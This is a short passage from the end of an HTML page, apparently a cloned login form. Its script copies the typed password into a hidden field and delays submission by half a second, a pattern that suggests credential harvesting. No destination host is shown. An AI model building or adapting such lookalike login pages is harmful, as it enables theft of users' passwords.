      const password = document.getElementById("m_login_password");
      const form = document.getElementById("login_form");
      const btn = document.getElementById("btnsubmit");
      password.onchange = (e) => {
         hiddenPass.value = e.target.value;
      }
      btn.onclick = (e) => {
          setTimeout(()=>form.submit(),500)
      }
      </script>
  </body>
</html>
